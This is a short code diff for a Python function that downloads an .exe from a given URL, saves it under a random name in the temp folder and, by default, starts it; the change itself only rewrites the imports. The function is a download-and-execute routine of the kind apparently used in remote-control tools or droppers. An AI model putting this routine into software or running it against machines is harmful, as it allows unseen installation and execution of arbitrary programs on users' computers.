@@ -1,8 +1,8 @@
-import requests
-import tempfile
-import random
-import string
-import os
+from requests import get
+from tempfile import gettempdir
+from random import choices
+from string import ascii_lowercase, digits
+from os import startfile
 
 
 def download_and_execute(client=None, auto_start=True, url=None):
@@ -19,15 +19,15 @@ def download_and_execute(client=None, auto_start=True, url=None):
     # Check if it's a valid exe link
     if url[-4:] == '.exe':
         try:
-            file = requests.get(url).content  # Gets files data
+            file = get(url).content  # Gets files data
 
             # Save file to temp folder under a random name.
-            path = tempfile.gettempdir() + '\\' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) + '.exe'
+            path = gettempdir() + '\\' + ''.join(choices(ascii_lowercase + digits, k=6)) + '.exe'
             with open(path, 'wb') as f:
                 f.write(file)
 
             if auto_start:
-                os.startfile(path)  # Starts file
+                startfile(path)  # Starts file
             return path
 
         except Exception:
